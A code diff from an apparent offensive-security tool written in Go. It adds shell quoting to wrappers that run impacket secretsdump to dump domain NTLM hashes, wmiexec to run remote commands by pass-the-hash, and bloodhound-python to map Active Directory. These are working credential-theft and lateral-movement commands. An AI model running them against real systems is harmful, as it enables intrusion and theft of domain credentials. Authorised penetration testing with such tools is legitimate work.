@@ -8,6 +8,10 @@ import (
 	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
 )
 
+func shellQuote(s string) string {
+	return strings.ReplaceAll(s, "'", "'\\''")
+}
+
 // ensureImpacket installs impacket inside the sandbox.
 func ensureImpacket(ctx context.Context, sb *sandbox.Docker) error {
 	installCmd := "if ! python3 -c 'import impacket' &> /dev/null; then apt-get update && apt-get install -y python3-impacket python3-pip && pip3 install --break-system-packages bloodhound; fi"
@@ -34,7 +38,6 @@ func DumpLSASS(ctx context.Context, target, user, domain, password, ntlmHash str
 
 	var authArg string
 	if ntlmHash != "" {
-		// Normalise hash — accept either NTLM-only or full LM:NT format
 		parts := strings.Split(ntlmHash, ":")
 		switch len(parts) {
 		case 1:
@@ -46,7 +49,7 @@ func DumpLSASS(ctx context.Context, target, user, domain, password, ntlmHash str
 			}
 			authArg = fmt.Sprintf("-hashes %s:%s", lm, parts[len(parts)-1])
 		}
-		cmd := fmt.Sprintf("secretsdump.py %s '%s/%s@%s' -just-dc-ntlm 2>&1", authArg, domain, user, target)
+		cmd := fmt.Sprintf("secretsdump.py %s '%s/%s@%s' -just-dc-ntlm 2>&1", authArg, shellQuote(domain), shellQuote(user), shellQuote(target))
 		out, err := sb.Execute(ctx, cmd)
 		if err != nil {
 			return "", fmt.Errorf("secretsdump (hash auth) failed: %v\nOutput: %s", err, out)
@@ -57,7 +60,7 @@ func DumpLSASS(ctx context.Context, target, user, domain, password, ntlmHash str
 	if password == "" {
 		return "", fmt.Errorf("either password or ntlm_hash is required")
 	}
-	cmd := fmt.Sprintf("secretsdump.py '%s/%s:%s@%s' -just-dc-ntlm 2>&1", domain, user, password, target)
+	cmd := fmt.Sprintf("secretsdump.py '%s/%s:%s@%s' -just-dc-ntlm 2>&1", shellQuote(domain), shellQuote(user), shellQuote(password), shellQuote(target))
 	out, err := sb.Execute(ctx, cmd)
 	if err != nil {
 		return "", fmt.Errorf("secretsdump (password auth) failed: %v\nOutput: %s", err, out)
@@ -71,7 +74,6 @@ func PassTheHash(ctx context.Context, targetIP, user, hash, cmd string, sb *sand
 		return "", err
 	}
 
-	// Clean up hash if it contains the full string
 	parts := strings.Split(hash, ":")
 	var ntlm string
 	if len(parts) >= 4 {
@@ -80,9 +82,7 @@ func PassTheHash(ctx context.Context, targetIP, user, hash, cmd string, sb *sand
 		ntlm = hash
 	}
 
-	// Use wmiexec or smbexec from impacket
-	// The syntax is usually: wmiexec.py -hashes LMHASH:NTHASH user@ip cmd
-	execCmd := fmt.Sprintf("wmiexec -hashes %s %s@%s '%s'", ntlm, user, targetIP, cmd)
+	execCmd := fmt.Sprintf("wmiexec -hashes %s %s@%s '%s'", ntlm, shellQuote(user), shellQuote(targetIP), shellQuote(cmd))
 	out, err := sb.Execute(ctx, execCmd)
 	if err != nil {
 		return "", fmt.Errorf("pass-the-hash execution failed: %v\nOutput: %s", err, out)
@@ -108,12 +108,11 @@ func BloodHoundCollect(ctx context.Context, domain, dcIP, username, password, ha
 		}
 		authArg = fmt.Sprintf("--hashes %s", ntlm)
 	} else if password != "" {
-		authArg = fmt.Sprintf("-p '%s'", password)
+		authArg = fmt.Sprintf("-p '%s'", shellQuote(password))
 	}
 
-	cmd := fmt.Sprintf("bloodhound-python -d %s -u '%s' %s -dc %s -c All --zip", domain, username, authArg, dcIP)
-	
-	// BloodHound execution takes a while
+	cmd := fmt.Sprintf("bloodhound-python -d %s -u '%s' %s -dc %s -c All --zip", shellQuote(domain), shellQuote(username), authArg, shellQuote(dcIP))
+
 	out, err := sb.Execute(ctx, cmd)
 	if err != nil {
 		return "", fmt.Errorf("bloodhound collection failed: %v\nOutput: %s", err, out)
